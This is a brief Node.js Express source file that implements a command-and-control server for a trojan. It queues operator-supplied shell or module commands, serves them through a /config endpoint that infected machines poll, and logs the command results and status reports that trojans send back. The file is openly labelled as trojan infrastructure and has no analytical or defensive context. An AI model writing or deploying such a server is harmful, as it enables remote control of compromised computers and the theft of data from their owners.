const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

let trojanConfig = {
    commands: [],
    stop: false
};

app.use(bodyParser.json());

app.post('/send-command', (req, res) => {
    const command = req.body;
    if (command && (command.type === 'shell' || command.type === 'module') && (command.command || command.module)) {
        trojanConfig.commands.push(command);
        console.log(`Command added: ${JSON.stringify(command)}`);
        res.status(200).json({ message: 'Command received', command });
    } else {
        console.log('Invalid command format');
        res.status(400).json({ message: 'Invalid command format' });
    }
});

app.get('/config', (req, res) => {
    res.status(200).json(trojanConfig);
});

app.post('/command', (req, res) => {
    const { command, result } = req.body;
    console.log(`Result of command '${command}':\n${result}`);
    res.status(200).json({ message: 'Result received' });
});

app.post('/status', (req, res) => {
    const { id, status } = req.body;
    console.log(`Status update from Trojan ${id}: ${status}`);
    res.status(200).json({ message: 'Status received' });
});

app.listen(port, () => {
    console.log(`Node.js server listening on port ${port}`);
});

